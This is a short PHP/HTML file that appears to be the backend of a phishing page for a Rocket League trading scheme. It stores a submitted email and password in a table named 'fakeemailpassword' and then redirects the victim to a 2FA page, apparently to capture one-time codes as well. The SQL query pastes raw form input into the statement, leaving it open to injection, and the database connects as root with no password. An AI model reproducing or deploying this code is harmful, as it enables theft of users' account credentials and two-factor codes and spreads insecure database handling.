<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body style="background:#121212; color: white;">
<?php
    $email=$_POST["fakeEmail"];
    $fakepassword=$_POST["fakePassword"];
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "rocketleaguetrading";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
    }

    $sql = "INSERT INTO fakeemailpassword (Email, FakePassword, 2fa_Code)
    VALUES ('$email', '$fakepassword', '0')";

    if ($conn->query($sql) === TRUE) {
    echo " ";
    } else {
    echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
?>
</body>
<script>window.location = "2fa.html"</script>
</html>